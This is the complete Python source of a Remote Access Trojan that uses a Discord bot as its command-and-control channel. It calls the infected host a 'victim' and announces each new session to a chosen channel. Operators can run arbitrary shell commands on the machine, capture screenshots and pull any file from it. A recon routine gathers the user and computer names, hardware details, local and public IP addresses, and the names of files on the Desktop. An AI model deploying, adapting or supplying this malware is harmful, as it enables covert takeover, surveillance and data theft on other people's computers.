import discord
import subprocess
import os
import platform
import psutil
import mss
import socket
import asyncio
import tempfile

import requests

BOT_TOKEN = "your_discord_bot_token_here"
TARGET_CHANNEL = "rat-channel"

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

SYSTEM_ID = f"{os.getenv('USERNAME')}@{os.getenv('COMPUTERNAME')}"

def execute_command(command): #execute system command (from CMD) and return output 
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        return result.decode('latin-1', errors='ignore')
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode('latin-1', errors='ignore')}"
    except Exception as e:
        return f"Exception: {str(e)}"
    
def get_system_info():
    info = []
    info.append("============ SYSTEM RECON =============")
    info.append("\n----------Computer and User Information----------")
    try: # Get basic system info
        info.append(f"User: {os.getenv('USERNAME')}")
        info.append(f"Computer Name: {os.getenv('COMPUTERNAME')}")
        info.append(f"OS: {platform.system()} {platform.release()} (version {platform.version()})")
        info.append(f"Hostname: {socket.gethostname()}")
    except Exception as e:
        info.append(f"Error retrieving basic info: {e}")

    try: # Get computer info
        info.append(f"Processor: {platform.processor()}")
        info.append(f"Machine: {platform.machine()}")
        info.append(f"RAM: {round(psutil.virtual_memory().total / (1024**3))} GB")

        cpu_name = subprocess.check_output('wmic cpu get name', shell=True).decode().strip().split('\n')[1]
        info.append(f"CPU: {cpu_name}")

        gpu_info = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().strip().split('\n')
        gpus = [line.strip() for line in gpu_info if line.strip() and "Name" not in line]
        info.append(f"GPU(s): {', '.join(gpus)}")
    except: pass


    info.append("\n---------- Network Information ----------")

    try: # Get local IP
        local_ip = socket.gethostbyname(socket.gethostname())
        info.append(f"Local IP: {local_ip}")
    except Exception as e:
        info.append("Local IP: Unavailable {e}")   

    try: # Get public IP
        ip = requests.get('https://api.ipify.org',timeout=3).text
        info.append(f"Public IP: {ip}")
    except: info.append("Public IP: Unavailable")

    info.append("\n---------- Computer programs and files ----------")

    try: # Desktop files
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        files = os.listdir(desktop_path)
        files_only = [f for f in files if os.path.isfile(os.path.join(desktop_path, f))]
        info.append("\n------ Desktop Files ------")
        info.append(f"Desktop Files: {', '.join(files_only[:20])} {'...' if len(files_only) > 20 else ''}")
    except: pass

    info.append("============= END OF RECON ===============\n\n")
    return "\n".join(info)

    

@client.event
async def on_ready():
    print(f'[+] RAT Online: {client.user}')
    for guild in client.guilds:
        for channel in guild.text_channels:
            if channel.name == TARGET_CHANNEL:
                await channel.send(f"🐍 **New Session Connected!**\nTarget: `{SYSTEM_ID}`\nIP: `{socket.gethostbyname(socket.gethostname())}`\nOS: `{platform.system()} {platform.release()}`")
                break

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.channel.name != TARGET_CHANNEL:
        return

    if message.content == "!help":
        help_msg = """
        **🐍 RAT Command Menu**
        `!cmd <command>` - Execute terminal command
        `!screenshot` - Take a screenshot
        `!download <path>` - Download file from victim
        `!info` - Get basic system info
        `!kill` - Stop the RAT connection
        """
        await message.channel.send(help_msg)

    elif message.content.startswith("!cmd "):
        command = message.content[5:]
        await message.channel.send(f"⚡ Executing: `{command}` on `{SYSTEM_ID}`...")

        output = execute_command(command)
        if len(output) > 1900:
            with open("output.txt", "w") as f:
                f.write(output)
            await message.channel.send("Output too long, sending file:", file=discord.File("output.txt"))
            os.remove("output.txt")
        else:
            await message.channel.send(f"```{output}```")

    elif message.content == "!screenshot":
        path = os.path.join(tempfile.gettempdir(), "screenshot.png")
        with mss.mss() as sct:
            sct.shot(mon=-1,output=path)
        await message.channel.send("📸 Screenshot taken:", file=discord.File(path))
        os.remove(path)

    elif message.content == "!info":
        info = get_system_info()
        if len(info) > 1990:
            with open("system_info.txt", "w") as f:
                f.write(info)
            await message.channel.send("System info too long, sending file:", file=discord.File("system_info.txt"))
            os.remove("system_info.txt")
        else:
            await message.channel.send(f"```{info}```")

    elif message.content.startswith("!download "):
        file_path = message.content[10:]
        if os.path.isfile(file_path):
            await message.channel.send(f"📁 Downloading file: `{file_path}`", file=discord.File(file_path))
        else:
            await message.channel.send(f"❌ File not found: `{file_path}`")
    
    elif message.content == "!kill":
        await message.channel.send(f"💀 Terminating RAT on `{SYSTEM_ID}`. Goodbye!")
        await client.close()
        exit()


def start_rat():
    try:        
        client.run(BOT_TOKEN)
    except Exception as e:
        print(f"Error starting RAT: {e}")

if __name__ == "__main__":
    start_rat()

        
    